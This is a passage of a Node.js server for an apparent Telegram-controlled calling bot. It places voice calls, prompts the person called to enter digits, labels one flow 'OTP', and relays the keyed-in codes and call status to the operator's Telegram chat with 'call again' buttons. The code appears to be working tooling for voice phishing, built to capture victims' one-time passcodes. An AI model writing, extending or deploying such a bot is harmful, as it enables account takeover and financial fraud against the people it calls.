          options: {
            url: `${
              process.env.ENDPOINT_URL
            }/custom/${step}/${chatId}/${language}?actions=${JSON.stringify(
              ac.splice(1, 2),
            )}&action=${ac[0][0]}`,
          },
        },
      ],
    });
  }

  if (dtmf) {
    await bot.telegram.sendMessage(chatId, `${action} <b>${dtmf}</b> 👻`, {
      parse_mode: 'HTML',
    });
  }

  if (ac.length) {
    return res.json({
      id: uuidv4(),
      title: `custom - ${chatId} OTP`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload: `GREAT, you have entered ${dtmf.split('').join(', ')}, ${
              ac[0][1]
            }`,
            language,
            voice: 'female',
            loop: true,
          },
          onKeypressGoto: 'customStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: 20,
        },
        {
          id: uuidv4(),
          action: 'pause',
          options: {
            length: 5,
          },
          onKeypressGoto: 'customStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: 20,
        },
        {
          id: 'customStepGoto',
          action: 'fetchCallFlow',
          options: {
            url: `${
              process.env.ENDPOINT_URL
            }/custom/${step}/${chatId}/${language}?actions=${JSON.stringify(
              ac.splice(1, 2),
            )}&action=${ac[0][0]}`,
          },
        },
      ],
    });
  }

  return res.json({
    id: uuidv4(),
    title: `call custom - ${chatId}`,
    record: false,
    steps: [
      {
        id: uuidv4(),
        action: 'say',
        options: {
          payload: `GREAT, you have entered ${dtmf
            .split('')
            .join(', ')}. Thank you. Goodbye`,
          language,
          voice: 'female',
        },
      },
    ],
  });
});

app.post('/calls/:chatId', async (req, res) => {
  const { chatId } = req.params;
  const { status, destination, webhook, Status } = req.body.items[0].payload;

  if ((!chatId || !webhook) && !Status) {
    return res.send('success');
  }

  if (status === 'ringing' || status === 'starting') {
    await bot.telegram.sendMessage(chatId, `Ringing (${destination}) 🔔`);
  }

  if (status === 'busy') {
    await bot.telegram.sendMessage(
      chatId,
      '<b>On another call </b> ❌\n\nCall again',
      {
        parse_mode: 'HTML',
        reply_markup: Markup.inlineKeyboard([
          Markup.button.callback('👍🏽 Yes', 'yesCallAgain'),
          Markup.button.callback('👎🏽 No', 'noCallAgain'),
        ]).reply_markup,
      },
    );
  }

  if (Status === 'MACHINE') {
    await bot.telegram.sendMessage(chatId, '<b>Voicemail</b> ❌', {
      parse_mode: 'HTML',
    });
  }

  if (status === 'cancelled') {
    await bot.telegram.sendMessage(
      chatId,
      'Call could not be placed, the number is unreachable ❌.',
    );

    await bot.context.scene?.enter('super-wizard');
  }

  if (status === 'failed' || status === 'declined') {
    await bot.telegram.sendMessage(chatId, '<b>Hang up</b> ❌\n\nCall again', {
      parse_mode: 'HTML',
      reply_markup: Markup.inlineKeyboard([
        Markup.button.callback('👍🏽 Yes', 'yesCallAgain'),
        Markup.button.callback('👎🏽 No', 'noCallAgain'),
      ]).reply_markup,
    });
  }

  if (status === 'no_answer' || status === 'timeout') {
    await bot.telegram.sendMessage(chatId, '<b>No answer</b> ❌', {
      parse_mode: 'HTML',
      reply_markup: Markup.inlineKeyboard([
        Markup.button.callback('👍🏽 Yes', 'yesCallAgain'),
        Markup.button.callback('👎🏽 No', 'noCallAgain'),
      ]).reply_markup,
    });
  }

  // if (status === 'failed') {
  //   await bot.telegram.sendMessage(
  //     chatId,
  //     '😔💔 Bot is down and will back soon.\n\nPlease contact admin to follow up.',
  //     {
  //       parse_mode: 'HTML',
  //       reply_markup: Markup.inlineKeyboard([
  //         Markup.button.callback('Try again', 'start'),
  //       ]).reply_markup,
  //     },
  //   );

  //   await bot.context.scene?.enter('super-wizard');
  // }
  if (status === 'ended') {
    await bot.telegram.sendMessage(chatId, '<b>Ended.</b>.\n\nCall again? 📞', {
      parse_mode: 'HTML',
      reply_markup: Markup.inlineKeyboard([
        Markup.button.callback('👍🏽 Yes', 'yesCallAgain'),
        Markup.button.callback('👎🏽 No', 'noCallAgain'),
      ]).reply_markup,
    });
  }
  res.send('success');
});

const port = process.env.PORT || 8888;

app.get('/', (_, res) => {
  res.send('Hello World!');
});

app.listen(port, () =>
  // eslint-disable-next-line no-console
  console.log(`⚡⚡⚡ Server has started on http://localhost:${port}`),
);
